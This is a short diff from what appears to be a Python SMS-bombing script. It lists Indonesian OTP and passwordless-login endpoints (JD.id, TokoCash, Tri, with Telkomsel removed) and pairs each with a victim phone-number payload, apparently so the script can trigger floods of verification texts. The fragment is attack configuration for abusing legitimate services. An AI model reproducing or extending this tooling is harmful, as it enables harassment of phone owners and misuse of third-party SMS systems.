@@ -20,9 +20,7 @@ def banner():
     print ""
 def post_data():
     data = {"jdid":["http://sc.jd.id/phone/sendPhoneSms",
-           {"phone":no.replace("+62","0"), "smsType":"1"}],        
-            "Telkomsel":["https://tdwidm.telkomsel.com/passwordless/start",
-           {"phone_number": no, "connection":"sms"}],      
+           {"phone":no.replace("+62","0"), "smsType":"1"}],      
             "tokoCash":["https://www.tokocash.com/oauth/otp",
            {"msisdn": no, "accept":"sms"}],
            "SMS-TRI":["https://registrasi.tri.co.id/daftar/generateOTP", {"msisdn":no}]
